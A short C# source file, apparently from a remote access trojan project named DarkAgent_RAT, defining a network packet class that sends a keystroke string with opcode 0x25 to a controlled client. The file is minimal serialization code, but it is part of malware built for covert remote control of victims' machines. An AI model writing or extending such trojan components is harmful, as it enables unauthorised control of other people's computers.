using System;
using System.Collections.Generic;
using System.Text;

namespace DarkAgent_RAT.src.Network.DataNetwork.Packets.Send
{
    class S_RemoteKeyboard : SendBasePacket
    {
        private string key;

        public S_RemoteKeyboard(RatClients client, string key)
            : base(client)
        {
            this.key = key;
        }
        protected internal override void Write()
        {
            WriteByte(0x25);
            WriteString(key);
        }
    }
}
